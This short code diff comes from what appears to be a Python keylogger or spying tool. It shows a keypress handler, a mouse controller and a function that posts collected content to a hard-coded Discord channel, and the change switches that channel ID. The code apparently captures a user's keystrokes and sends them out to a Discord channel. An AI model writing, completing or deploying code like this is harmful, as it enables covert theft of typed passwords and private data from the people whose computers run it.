@@ -27,7 +27,7 @@ mouse = Mcontroller()
 async def send_to_discord(content):
     if(content != ""):
         global list
-        channel = client.get_channel(762409529266274377)
+        channel = client.get_channel(764343351998021662)
         await channel.send(content)
 def on_press(key):
     global list
